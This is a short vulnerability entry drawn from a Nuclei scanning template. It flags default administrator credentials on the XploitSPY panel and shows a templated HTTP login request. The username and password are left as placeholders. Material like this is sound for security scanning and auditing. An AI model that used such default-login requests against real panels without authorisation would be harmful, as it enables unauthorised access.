# Vulnerability: XploitSPY - Default Login
**Classification:** XPLOITSPY
**Source:** Nuclei Template (`xploitspy-default-login.yaml`)

## Description
Default login and password to access administrator panel

## Vulnerable Code Pattern / Exploit Payload
```http
POST /login HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Referer: {{RootURL}}/login

username={{user}}&password={{pass}}&hostname={{Hostname}}
```

